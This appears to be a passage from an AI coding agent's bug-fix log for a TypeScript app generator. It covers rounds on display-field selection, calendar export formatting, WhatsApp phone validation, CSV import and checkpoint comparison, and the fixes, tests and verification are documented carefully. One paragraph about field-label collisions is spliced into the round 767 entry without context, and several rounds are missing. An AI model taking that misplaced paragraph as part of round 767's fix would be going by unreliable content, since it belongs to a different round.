Still no genuine reply from שלומי. Round 761's own survey had deliberately descoped this exact observation as "a more debatable field-selection-preference question" rather than a clearly-demonstrated bug -- this round's fresh survey was explicitly pointed at it to investigate properly, with instructions to only pursue it if it held up as a genuine, demonstrable gap rather than a judgment call.

**Independent verification before implementing**: confirmed the text/longtext-equivalence convention is real and established elsewhere in this codebase by reading each cited call site directly -- `AutomationsPanel.tsx:112/246`'s `phoneFields`/`firstPhoneField` (`f.type === "text" || f.type === "longtext"`), `packages/db/src/migrate.ts:363`'s `type_changed` branch (`field.type !== "text" && field.type !== "longtext"`), and `apps/api/src/routes/projects.ts:596`'s `validateAutomationToField` (same pairing, for which field types can hold a WhatsApp destination phone number). Also checked whether `pickDisplayField`'s own "short human label" framing (its doc comment literally says "short") was a reason to deliberately exclude a potentially-long `longtext` value -- but confirmed this codebase already applies `text-overflow: ellipsis` broadly in its CSS for exactly this kind of value-length concern, and nothing already enforces short values specifically for `type: "text"` either (a `text` field's value can itself be arbitrarily long), so the "short label" framing was never actually a hard guarantee this fix would be breaking.

**The gap**: `pickDisplayField`'s "first text field" step (`entity.fields.find((f) => f.type === "text")`) checked only `"text"`, never `"longtext"` -- across all four duplicated copies of this function: `apps/api/src/displayField.ts`, `apps/web/src/entityFormatting.ts`, and *two* separate copies inside `apps/api/src/codegen.ts` (the exported app's own `pickDisplayField`, inside `renderEntityViewJsx`, and a previously-unnoticed fourth copy, `backupPickDisplayField`, the backup-CSV-feature's own independent duplicate inside `renderServerJs` -- rounds 749/761 had each already fixed this exact fallback chain in the first three locations but this fourth copy had been present all along without being named explicitly in either round's own documentation). An entity like `Feedback { message: longtext, rating: number, submittedDate: date }` -- no name/title/text field, only a longtext field holding the actual useful content -- would skip past `message` and land on `rating` (a plain number) as the display field, labeling every record by its numeric rating instead of its feedback text: the same class of "wrong field picked as the human label" bug rounds 749 (file exclusion) and 761 (enum-label resolution) already fixed for other field types in this identical chain.

**Why this is not deliberate**: read `apps/api/src/displayField.test.ts` and `apps/web/src/entityFormatting.test.ts` in full. The only existing text-fallback test uses a field literally typed `"text"` and never exercises `"longtext"` at all -- no test anywhere asserts longtext must be skipped, and no code comment anywhere (across any of the four copies) explains an intentional text-vs-longtext distinction for display-field selection; the existing comments only ever discuss excluding `relation` and `file`.

**The fix**: in all four copies, the "first text field" step now tries `longtext` as a second choice -- `entity.fields.find((f) => f.type === "text") ?? entity.fields.find((f) => f.type === "longtext")` (two sequential finds, not a single combined `||` test-condition on one `.find()` call) -- so a real `text` field anywhere on the entity still wins over a `longtext` field even when the `longtext` field is declared earlier, preserving today's implicit text-over-longtext preference exactly, while only reaching for `longtext` when no plain `text` field exists at all.

**codegen.ts parity**: both of its own copies (the main exported-app `pickDisplayField` and the backup-CSV `backupPickDisplayField`) were fixed in this same round -- confirmed via direct grep that these are genuinely the only two `f.type === "text"` checks in that file for this fallback step.

**The tests**: `displayField.test.ts` and `entityFormatting.test.ts` each gained two new tests -- one confirming the longtext fallback itself (`Feedback{rating:number, message:longtext}` → `message` wins), one confirming the text-over-longtext tiebreak still holds even when longtext is declared first (`Feedback{message:longtext, summary:text}` → `summary` wins). `codegen.test.ts` gained matching pairs of tests for both copies, using the established `new Function(...)`-based real-generated-source extraction convention each copy's existing sibling tests already use.

**Verification**: four separate regression-proof cycles, one per copy -- reverting each copy's fix back to the original single `f.type === "text"` check (using targeted `sed` line-number edits for codegen.ts's two copies, since both lines are byte-identical text and a string-match edit would have hit the wrong one) reproduced the identical predicted failure in each (`'rating' !== 'message'`), while the paired tiebreak test in each file correctly kept passing throughout (it doesn't depend on the broken branch), before each was restored clean. Re-ran every new test alongside its full sibling `pickDisplayField` test group afterward (12/12 in `displayField.test.ts`, 2/2 in the targeted `codegen.test.ts` group, 7/7 in `entityFormatting.test.ts` -- all clean). Both `apps/api` and `apps/web` changed this round, so both full suites ran: `apps/api` 529/530 (the sole failure being the same, now-twelfth-confirmed-unrelated `codegen.test.ts` exit-hang flake), `apps/web` 1071/1071 clean with no flake this run. Both `npm run build`s clean.

### Round 763: `buildCalendarIcs`'s DESCRIPTION-line formatter never locale-formatted a number or date field, unlike relation/enum/file/boolean (added piecemeal across rounds 636/694/742/747) and unlike the identically-purposed `interpolateTemplate`

Still no genuine reply from שלומי. The `pickDisplayField`/`fieldValueLabel`/webhook-SSRF clusters had each had 2-3 consecutive rounds, so this round's fresh Explore survey was explicitly steered to a different feature area and found this in the calendar export.

**The gap**: `buildCalendarIcs` (duplicated in `apps/web/src/calendarIcs.ts` and `apps/api/src/codegen.ts`'s exported-app copy) builds a VEVENT `DESCRIPTION` with one `Label: value` line per field. The ternary chain resolving each field's `value` had dedicated branches for `relation`/`enum`/`file`/`boolean` -- each added in its own earlier round, with that round's own doc comment still present above the branch -- but `number` and `date` fell straight through to the raw `record[f.name]`: a number field like "budget" exported `"50000"` instead of `"50,000"`, and a non-primary date field exported a raw `"2026-04-01"` ISO string instead of a locale-formatted date. Neither function took a `lang` parameter at all, so there was no way to locale-format even if a branch had existed. Reachable by any entity with ≥1 date field (which automatically gets a Calendar view) and a number or secondary date field -- e.g. the built-in "Project" domain entity (`name`, `client`, `status` enum, `deadline` date, `budget` number) or the Sales CRM template's `Deal` entity (`value: number`, `closeDate: date`) -- via the Calendar view's own "Export to Calendar" button.

A `.ics` calendar export is exactly as one-way as a WhatsApp message -- consumed by a real calendar app, never re-imported by this app -- so the CSV round-trip rationale for leaving these two raw doesn't apply here, and nothing in `calendarIcs.ts`'s own comments ever claimed it did. `calendarIcs.test.ts` has 20+ tests covering relation/enum/file/boolean/label-collision/field-order in this exact DESCRIPTION builder, but zero tests exercising a number ≥1000 or a non-primary date field -- no existing assertion would even have revealed `"15000"` vs `"15,000"`. `apps/api/src/codegen.ts`'s hand-duplicated copy had the byte-identical gap, confirming this wasn't a one-off typo.

**The fix**: `apps/web/src/calendarIcs.ts`'s `buildCalendarIcs` gained a new optional `lang: Lang = "en"` parameter (threaded from `EntityPanel.tsx`'s `handleExportIcs`, which already had `lang` in scope via `useTranslation()` for its own calendar-grid formatting) and two new branches calling new `formatIcsDescriptionDate`/`formatIcsDescriptionNumber` helpers that mirror `interpolateTemplate`'s exact approach (`parseFieldDate` + `toLocaleDateString(LOCALE[lang])` / `Number(value).toLocaleString(LOCALE[lang])`, falling back to the raw value when unparseable). `apps/api/src/codegen.ts`'s exported-app copy has no language-switching mechanism of its own (confirmed by grepping the whole file for any `LOCALE`/`LanguageContext`/`lang` concept near this code -- none exists), so its matching two branches instead mirror that same file's own existing on-screen table-cell convention: bare `toLocaleDateString()`/`toLocaleString()` with no explicit locale argument, exactly like its EntityView table cells already do (confirmed at several other call sites in the same file).

**codegen.ts parity**: both the live-preview fix and the exported-app's own copy were fixed in this same round, each following that surface's own existing locale convention rather than a one-size-fits-all port.

**The tests**: `calendarIcs.test.ts` gained one new test (a `Project` entity with `budget: number` and `deadline: date` fields, asserting the DESCRIPTION lines read `50\,000` -- comma escaped per RFC 5545's own TEXT-escaping rule, confirmed by checking the actual output before writing the assertion -- and `1.4.2026`, the real `he-IL` output for `toLocaleDateString`, verified directly in Node before trusting it in the test). `codegen.test.ts` gained a mirroring test using the established `new Function(...)`-based real-generated-source extraction convention. Fixing the helper-function extraction surfaced a real syntax error first: a literal backtick inside a code comment I wrote broke out of the *outer* TypeScript template literal that embeds this whole generated-app source as a string in `codegen.ts` itself, caught immediately by esbuild failing to transform the file at all -- fixed by rewording the comment to avoid the backtick, re-confirming the lesson that this file's comments are live source text, not inert annotations, from the generator's own perspective. Also had to extend one **pre-existing** test's own extraction list (round 637's "disambiguates two description fields that share a label" test, which uses two `number` fields and therefore now reaches the new branch) with the newly-needed helper sources (`CALENDAR_DATE_FORMAT`, `parseFieldDate`, `formatIcsDescriptionDate`, `formatIcsDescriptionNumber`) -- checked every other existing `buildCalendarIcs` test's own fixture individually (by grepping each one's entity/record definitions for `type: "number"`/a second `type: "date"` field) to confirm none of the other eight needed the same update, since only a field that reaches the new branches at runtime requires the new helpers in that test's own assembled `new Function(...)` closure.

**Verification**: two separate regression-proof cycles, one per file -- gating each file's two new branches behind `false &&` (a real inert-condition edit) reproduced the identical predicted failure in each (the raw `"50000"`/`"2026-04-01"` values appearing verbatim in the generated `.ics` output instead of the formatted ones) before being restored clean. Re-ran every `buildCalendarIcs` test in both files afterward (22/22 in `calendarIcs.test.ts`, 10/10 in the `codegen.test.ts` `buildCalendarIcs` group, plus `EntityPanel.test.ts`'s own two real end-to-end ICS-export tests -- all clean, confirming the new optional `lang` parameter didn't disturb any existing call site). ### Round 764: AutomationsPanel's "Create automation rule" entity dropdown ignored the user's own drag-reordered entity-tab order -- the exact gap round 713 fixed for Global Search, freshly identified for a second, never-audited consumer

Still no genuine reply from שלומי. **The gap**: `AutomationsPanel.tsx` derived its entity list with `const entities = project.spec.entities;` -- the spec's original declared/build order -- never consulting `entityTabOrder.ts`'s persisted drag/keyboard-reordered tab order the way the entity tab bar itself does (`App.tsx`'s own `orderedEntities = useMemo(() => applyColumnOrder(project.spec.entities, entityTabOrder), ...)`). The "Create automation rule" form's entity `<select>` (`entities.map((e) => ...)`) and its default-selected entity (`entities[0]`, both at component-init and in `resetToCreateMode`) therefore always listed/defaulted to entities in build order, contradicting every other entity-order-sensitive surface in the app: the tab bar itself, Global Search (fixed in round 713, for the identical reason), and the many already-fixed `columnOrder.ts`-driven field-order pickers (filter dropdowns, group-by, bulk-edit, CSV/ICS export, rounds 678-694). Comparing the two call sites in `App.tsx` directly made the gap obvious: `<GlobalSearchPanel entities={orderedEntities} ...>` right next to `<AutomationsPanel project={project} ...>` with no `entities` prop at all.

**Why this is not deliberate**: grepped `AutomationsPanel.test.ts` for every mention of `entityTabOrder`/reordering -- zero matches, so nothing pins the current build-order listing as intentional. `entityTabOrder.ts`'s own round-713 fix explicitly documented that it had just audited and found exactly one missed consumer (Global Search) beyond `App.tsx`'s own tab bar -- that audit never looked at `AutomationsPanel`, which is structurally identical in shape to the gap it had just closed, and simply hadn't been checked yet.

**The fix**: added an optional `entities?: Entity[]` prop to `AutomationsPanel`, defaulting to `project.spec.entities` for backward compatibility with every existing caller/test that doesn't pass it (TypeScript destructuring defaults can reference an earlier-bound parameter in the same parameter list, so `entities = project.spec.entities` works directly in the function signature without extra plumbing). Removed the now-redundant `const entities = project.spec.entities;` from the component body. Every other `entities`-derived usage in the file (`entities[0]` at init and in `resetToCreateMode`, plus every `.find(...)`/`.name`-keyed lookup elsewhere) looks up by name or position-as-"first/default", not by any assumption about a specific declared order, so reordering the source array is low-risk and changes exactly the two things that should change: the dropdown's rendered order and the create-form's default-selected entity. Updated `App.tsx`'s real call site to pass `entities={orderedEntities}`, the same prop App.tsx already threads to `GlobalSearchPanel`.

**codegen.ts parity**: confirmed not needed -- grepped `apps/api/src/codegen.ts` for "Automation": zero matches, the exported standalone app has no Automations feature at all (consistent with every other automations-area round's own finding).

**Verification**: two separate regression-proof cycles -- reverting `App.tsx`'s call site back to `entities={project.spec.entities}` reproduced the exact predicted failure in the new `App.test.ts` test (while the pre-existing `GlobalSearchPanel` sibling test correctly kept passing, confirming the new test exercises the right call site) before restoring; separately, reverting `AutomationsPanel.tsx` itself back to its exact original pre-fix shape (renaming the destructured prop to an unused binding and reintroducing the original `const entities = project.spec.entities;` line, rather than a `false &&`-style gate, since this is a structural signature change, not a boolean branch) reproduced the exact predicted failure in the new behavioral test (`['Order','Courier']` instead of `['Courier','Order']`) before restoring. ### Round 765: `sendMessage` silently accepted a phone number with 3+ leading zeros, missing its country code

Still no genuine reply from שלומי. Round 764's own survey had flagged this exact candidate as a weak, unverified secondary lead; this round's fresh survey was explicitly pointed at investigating it properly, and it held up as a genuine, empirically-confirmed bug.

**The gap**: `apps/api/src/whatsappWeb.ts`'s `WhatsAppWebManager.sendMessage` classifies a `to` value's leading-zero count (counted on the *raw* string, before `normalizePhone`'s own stripping) to decide whether a country code is missing: exactly 1 leading zero is the local trunk prefix (country code missing, rejected as `missing_country_code`); exactly 2 is the "00" international access code (already fully qualified, allowed); the surrounding doc comment explicitly enumerates only these two cases plus "0 is either already-international or untaggable either way." The code only ever checked `leadingZeros === 1` -- so 3, 4, or more leading zeros fell through neither branch and silently proceeded to the happy path. `normalizePhone` (`apps/api/src/whatsapp.ts`) strips the *entire* run of leading zeros regardless of count, so a realistic data-entry mistake -- typing the "00" international-access convention but keeping the destination's own local trunk zero too, e.g. "00" + "0501234567" = "000501234567" (3 leading zeros) -- normalized to "501234567", the exact same country-code-missing shape the 1-zero branch exists to reject, yet built a real JID and called `sock.sendMessage`, returning `{ ok: true }`. Verified empirically (not just by reasoning): ran the real classification logic directly, confirming 0/1/2-leading-zero inputs behaved exactly as the existing tests already assert, while 3 and 4 leading zeros both incorrectly passed through before the fix.

**Why this is not deliberate**: read `apps/api/src/whatsappWeb.test.ts` in full for every `sendMessage` phone-related test -- there are tests for 0 leading zeros (already-qualified, including a cross-country case the doc comment itself calls out), exactly 1 (reject), exactly 2 (the "00" case, allow), and no digits at all (`invalid_phone_number`) -- but no test for 3 or more leading zeros in either direction. The function's own doc comment enumerates exactly three cases (0, 1, 2) and never mentions a fourth "3+" bucket as intentionally-accepted, so this reads as a genuinely overlooked case in an otherwise carefully-reasoned function, not a considered design choice.

**The fix**: changed the rejection condition from `leadingZeros === 1` to `leadingZeros === 1 || leadingZeros >= 3`, leaving only 0 and 2 leading zeros as the two legitimate, unambiguous shapes the doc comment's own reasoning already establishes. Re-verified empirically after the fix that all four pre-existing cases (0, 1, 2 leading zeros, and the cross-country "+1" case) still classify identically, while 3 and 4 leading zeros now correctly reject.

**codegen.ts parity**: confirmed not needed -- the exported standalone app has no WhatsApp feature at all (grepped `codegen.ts` for `sendMessage`/`whatsappWeb`/`WhatsAppWebManager`: no matches).

**The tests**: `whatsappWeb.test.ts` gained one new test mirroring the existing "bare local-format number" test's exact structure -- sends to `"000-501-234-567"` (3 leading zeros) and asserts the real `sendMessage` call returns `{ ok: false, error: "missing_country_code" }` with no actual socket send attempted, placed directly alongside its 1-zero sibling test.

**Verification**: one regression-proof cycle -- reverting the condition back to the original `leadingZeros === 1` only (a real, targeted edit, not a blanket gate) reproduced the exact predicted failure (`result.ok` was `true` instead of `false`) before being restored clean. Re-ran all 7 `sendMessage` tests in the file afterward -- all clean, confirming no regression to the 0/1/2-leading-zero or cross-country cases. Only `apps/api` changed this round, so its own full suite ran: 531/532 (the sole failure being the same, now-fourteenth-confirmed-unrelated `codegen.test.ts` exit-hang flake). `npm run build` clean.

**Status**: shipped and pushed.

### Round 766: CSV import let a relation cell's "#<id>" shorthand override a genuine resolved display-label match

Still no genuine reply from שלומי. This round's survey was steered away from every area closed in rounds 745-765 (webhook SSRF, pickDisplayField/recordDisplayLabel family, AutomationsPanel field-value formatting, calendarIcs locale formatting, entity-tab ordering, WhatsApp leading zeros, upload XSS, CSV-apostrophe escaping) and landed on CSV import's relation-cell resolution logic -- a genuinely different feature area, and a resolution-priority bug rather than another display-formatting duplication.

**The gap**: `buildImportRecords` (`apps/web/src/entityFormatting.ts` lines ~1471-1498, and its hand-duplicated copy for the exported standalone app in `apps/api/src/codegen.ts` lines ~2241-2269) checked a relation cell's "#<id>" shorthand *before* trying a real display-label match:

```js
const hashMatch = raw.match(/^#(\d+)$/);
if (hashMatch) {
  record[field.name] = Number(hashMatch[1]);   // accepted unconditionally
  continue;
}
const matches = targetRecords.filter((r) => recordDisplayLabel(targetEntity, r).toLowerCase() === raw.toLowerCase());
```

`recordDisplayLabel` (entityFormatting.ts lines 988-994) returns `#<id>` as a fallback *only* when a record has no usable display value -- but nothing stops a record's real display field (its name/title/first-text field) from genuinely containing text like "#5" (a plausible SKU, ticket, or room-number convention). When it does, `recordDisplayLabel` returns that literal text as an ordinary, resolved label, and exporting that relation cell to CSV renders it correctly. Re-importing that same file unchanged hit the hashMatch branch first and silently set the field to id 5 -- whichever record that happens to be -- instead of resolving "#5" to the record whose real label actually is "#5". Concretely: `Product` has id=5 "Office Chair" and id=42 "#5" (a legitimately-named record); a `Deal.product` relation cell exported as "#5" (id 42's real label) re-imports as id 5 ("Office Chair") with zero error reported. Separately, the legitimate shorthand path (`raw` genuinely meaning an id reference, when no real label can be resolved at all) never checked that the referenced id exists in `targetRecords` either -- a typo in the exact "#<id>" form the ambiguous-match error message itself tells users to use fell through to a generic FK-violation error at the per-record write step instead of a clear, immediate row error.

**Why this is not deliberate**: `recordDisplayLabel`'s own doc comment describes "#<id>" purely as what it renders "when the entity has no usable field or the display field is empty on this particular record" -- a fallback for the *absence* of a real label, not a reserved syntax a real label can never collide with. Nothing in the schema, the UI, or either function's reasoning excludes a text field from holding "#<digits>" as genuine data. The existing test at `entityFormatting.test.ts` line ~1801 only ever exercised the *intended* fallback case (no real label resolves at all); no test covered a record whose *real* label happens to equal the shorthand pattern, and no test covered a shorthand id that doesn't exist -- both read as genuinely unconsidered gaps, not design choices.

**The fix**: in both files, try the real display-label match first; only fall back to the "#<id>" shorthand when zero records' resolved labels match the raw cell, and even then only accept it once the referenced id is confirmed to exist among `targetRecords` (otherwise it now reports the same "doesn't match any ... record" row error every other unresolvable cell already gets, instead of silently writing a dangling reference).

**codegen.ts parity**: needed and done -- `buildImportRecords`'s relation branch is duplicated verbatim (JS-string form) in `codegen.ts` for the exported standalone app's own CSV import; ported the identical priority change there.

**The tests**: `entityFormatting.test.ts` -- updated the existing "#<id>" fallback test to use an id that actually exists in `relatedRecords` (its old premise, a *nonexistent* "#999", would now correctly be rejected by this round's own existence check); added a new test proving a record whose real label literally reads "#5" wins over misreading the cell as id 5; added a new test proving a "#<id>" cell naming a nonexistent id is now rejected with a row error instead of silently accepted. `codegen.test.ts` -- same three changes mirrored through the `new Function(...)` extraction/assembly convention this file's relation-import tests already use.

**Verification**: reverted the live-preview fix back to its original hash-first shape (a real, targeted edit, not a blanket gate) and re-ran `entityFormatting.test.ts` -- both new tests failed with exactly the predicted wrong behavior (resolving to id 5 instead of 42, and silently accepting id 999), while all other 184 tests still passed; restored the fix and reran clean (186/186). `apps/api`'s `codegen.test.ts` full run: 100/100 individual tests pass (the file's own process-level exit-hang flake, unrelated to any test content, is the sole non-pass and already documented across many prior rounds). `apps/web`'s full suite: 1076/1076 pass (one transient failure on an unrelated test during an earlier run turned out to be a flake -- confirmed clean on immediate re-run with no code changes in between). `npm run build` (apps/api, esbuild bundle of codegen.ts's generated source) clean.

**Status**: shipped and pushed.

### Round 767: Business Twin's duplicate-record detection never ran for an entity whose display field is longtext

Still no genuine reply from שלומי. This round's survey was steered away from every area closed through round 766 and found a gap created by round 762's own fix: a fix that widens a shared helper's behavior can leave an older, narrower consumer of that same helper silently out of sync, even when both live in the same file family.

**The gap**: `computeDuplicateObservations` (`apps/api/src/twin.ts` line 284) guards its entire check with `if (!displayField || displayField.type !== "text") continue;` -- skipping any entity whose `pickDisplayField` result isn't exactly type `"text"`. Round 762 widened `pickDisplayField` itself (`apps/api/src/displayField.ts`) to fall back to a `longtext` field when an entity has no name/title/text field at all (e.g. `Feedback { message: longtext required, rating: number }`), so `recordDisplayLabel` now renders such an entity's records by that longtext value everywhere else in the app -- relation pickers, Global Search, WhatsApp template interpolation, Business Twin's own `mostLinkedRecord` labeling. But this guard, written before that widening existed, still only recognized the literal string `"text"` and silently skipped the entity's duplicate check entirely. Concretely: two `Feedback` records both submitted with `message: "Great service, very happy!"` (different ratings) -- the textbook accidental-double-submit scenario this exact feature exists to catch -- produced zero "possibly a duplicate" observations, verified with a live repro before the fix.

**Why this is not deliberate**: the guard's own doc comment explains its reasoning as "this only runs for an entity whose picked display field is actually text -- the one case where two records sharing that value really does suggest the same person or thing was entered twice." That reasoning is about *free text* versus a coincidental number/date/enum match (its own example: two shipments both weighing 5kg) -- it never argues `longtext` specifically should be excluded, and this codebase's own established convention everywhere else (`pickDisplayField`'s own fallback, `AutomationsPanel.tsx`'s phoneFields, `pipeline.ts`'s seed-value check, `validateAutomationToField`, `migrate.ts`'s `type_changed` branch) treats `text`/`longtext` as the same free-text kind. `twin.test.ts` has a test for the non-text fallback case (a `number` field, line 536) but nothing anywhere in the file exercises `longtext` -- a genuinely overlooked consequence of round 762's widening, not a considered exclusion.

**The fix**: widened the guard to `displayField.type !== "text" && displayField.type !== "longtext"`, and updated its doc comment to describe the check as running for a "free-text" display field (text or longtext) rather than literally "text" only.

**codegen.ts parity**: confirmed not needed -- Business Twin (`computeBusinessTwin`/`computeDuplicateObservations`) is a live-preview-only feature; `grep -n "BusinessTwin" apps/api/src/codegen.ts` returns no matches, so the exported standalone app has no corresponding code to port this to.

**The tests**: added a new test to `twin.test.ts`, directly alongside the existing non-text-fallback test, using a `Feedback { message: longtext, rating: number }` entity with no name/title field, inserting two records with identical `message` text and different ratings, and asserting `computeBusinessTwin` now reports a "possibly a duplicate" observation covering both records.

**The gap (label collision)**: neither dropdown's `<option>` text, nor the rule list's own `fieldLabel()` helper, ever called `fieldLabelOccurrences`/`fieldDisplayLabel` -- this codebase's own established, documented convention (used by `EntityPanel.tsx`'s bulk-edit/filter pickers, both Print sheets, CSV export) for disambiguating two fields that legally share a label via the Field Label editor (e.g. `subtotal`/`shipping` both labeled "Amount"). ### Round 773: `isCheckpointCurrent` only ever compared entities/fields, wrongly marking a Time Machine checkpoint "Current" (and permanently disabling its own Restore button) when the rest of the spec genuinely differed

Still no genuine reply from שלומי. This round's survey was explicitly steered away from the Automations feature (rounds 770 and 772 both touched it) and landed on Time Machine/checkpoints -- a genuinely different, previously-closed-as-"solid" area that turned out to have a real gap once examined against the restore route's actual scope.

**The gap**: `isCheckpointCurrent`'s (`apps/web/src/checkpointDiff.ts`) own doc comment claims it answers "are you already looking at this checkpoint's state right now" -- but the implementation only ever compared entities/fields (as a set of names plus each shared field's `fieldSignature`), never `summary`, `roles`, `personas`, `screens`, `assumptions`, or `openQuestions`. The restore route (`apps/api/src/routes/projects.ts`, `updateProjectSpec(db, project.id, checkpoint.spec)`) replaces a project's **entire** spec, not just its entities/fields -- so a refine step that only reworded the summary or renamed a role, leaving every entity byte-identical, produced a checkpoint whose entities/fields matched the live spec exactly while its summary/role chips (both rendered prominently in `App.tsx`'s Spec Review view) genuinely differed. That checkpoint was wrongly shown with the "Current" chip in `HistoryPanel.tsx`, wrongly tagged `[Current]` in `formatCheckpointHistory`'s exported/copyable report text (same root cause, second surface), and -- the real-world cost -- had its own Restore button permanently disabled (`disabled={... || isCurrent}`), leaving the user with no way to revert back to a state the app itself falsely claimed they were already in.

**Why this is not deliberate**: the function's own doc comment explicitly promises the stronger, whole-state claim ("you are already looking at this") that the entities/fields-only implementation never delivered -- a mismatch between stated intent and actual scope, not a documented narrowing. `checkpointDiff.test.ts`'s own existing `isCheckpointCurrent` tests, and `HistoryPanel.test.ts`'s "Current" chip test, all use a `makeSpec`/checkpoint fixture with hardcoded-identical `summary`/`roles` ("s" / `["Admin"]`) across every checkpoint -- only `entities` ever varies -- so no existing test could have caught this.

**The fix**: extended the comparison to the full `ProductSpec` -- `summary`, `roles`, `personas`, `screens`, `assumptions`, `openQuestions` via plain/JSON equality (none of these have a drag-reorder feature anywhere in the UI, so their stored array order is their real display order and a direct comparison is correct) -- while keeping the existing order-insensitive, signature-based comparison for entities/fields, which was already correct on its own terms.

**codegen.ts parity**: confirmed not needed -- grepped `codegen.ts` for `isCheckpointCurrent`/`checkpointDiff`: no matches; Time Machine/checkpoints is a Forge-platform-only feature with no exported-app equivalent.

**The tests**: added a new test to `checkpointDiff.test.ts`, directly alongside the existing array-order test, using byte-identical entities/fields with a genuinely different summary, then a genuinely different roles array, asserting both are correctly rejected as "not current" -- plus a positive case confirming a truly identical full spec still passes.

**Verification**: reverted the fix back to the original entities/fields-only comparison (a real, targeted edit) and reran the new test -- failed exactly as predicted; restored the fix and reran clean. Full `checkpointDiff.test.ts` (36 tests) and `HistoryPanel.test.ts` (21 tests, the other direct consumer of `isCheckpointCurrent`) both pass clean, confirming no regression to the existing array-order/missing-entity/type-change tests. ### Round 774: WhatsApp message matching only ever checked the FIRST phone-like field on an entity, never a second one declared after it

Still no genuine reply from שלומי. This round's survey was explicitly steered away from WhatsApp's recently-closed areas and from Automations/Time Machine (rounds 770-773) and landed on `whatsapp.ts`'s own record-matching logic, a module no recent round had touched.

**The gap**: `findMatchingRecord` (`apps/api/src/whatsapp.ts`) used `entity.fields.find((f) => PHONE_FIELD_NAME_HINTS.includes(f.name.toLowerCase()))` to pick a single phone-like field per entity, then checked only that one field against every record's stored value. `PHONE_FIELD_NAME_HINTS` deliberately lists eight synonyms (`phone`, `mobile`, `phonenumber`, `mobilenumber`, `cellphone`, `cell`, `telephone`, `tel`) precisely because an AI-generated spec can plausibly use any of them -- but nothing stops a single entity from declaring *two* of them at once, an entirely ordinary real business shape: a Customer entity with both `phone` (an office/landline number, declared first) and `mobile` (the actual number that receives WhatsApp messages, declared second). Because `.find()` stops at the first hint match, `mobile` was never even looked at -- an inbound WhatsApp message from a real, existing contact whose office line happened to be recorded too would always fall through to "unknown number" in the message log, regardless of which field actually held the sender's number.

**Why this is not deliberate**: the function's own doc comment (before this round) never claimed "only the first phone field counts" -- it framed the whole point of `PHONE_FIELD_NAME_HINTS` as tolerating whichever synonym a real spec happens to use, with no indication that a second, equally valid field on the same entity should be silently ignored. None of the existing tests constructed an entity with more than one phone-like field, so the gap had no coverage either way.

**The fix**: changed `entity.fields.find(...)` to `entity.fields.filter(...)`, collecting every phone-like field on the entity, and added a nested loop so each record is checked against every one of its phone-like fields (not just the first) before moving to the next record. The matching logic itself (digit normalization, leading-zero/00-prefix stripping, suffix comparison) is unchanged -- only which fields get checked.

**codegen.ts parity**: confirmed not needed -- grepped `codegen.ts` for `findMatchingRecord`/`PHONE_FIELD_NAME_HINTS`: no matches; WhatsApp integration is a Forge-platform-only feature with no exported-standalone-app equivalent.

**The tests**: added a new test to `whatsapp.test.ts`, directly after the existing "skips entities that have no phone field" test, using a Customer entity with both `phone` (a non-matching office line) and `mobile` (the real match) declared in that order, asserting the incoming number is still matched via `mobile` even though it's declared second.

**Verification**: reverted the fix back to the original `.find()` + single-field check (a real, targeted edit) and reran the new test -- failed exactly as predicted (`findMatchingRecord` returned `null`); restored the fix and reran clean. Full `whatsapp.test.ts` file (9 tests) passes clean, confirming no regression to the existing international-prefix, synonym-name, and case-insensitivity tests. Only `apps/api` changed this round, so its own full suite ran: 535/536 pass (the sole failure, `codegen.test.ts` at `:1:1`, is the long-documented pre-existing exit-hang flake, confirmed unrelated across 17+ rounds now). `npm run build` (esbuild bundle) clean.

**Status**: shipped and pushed.
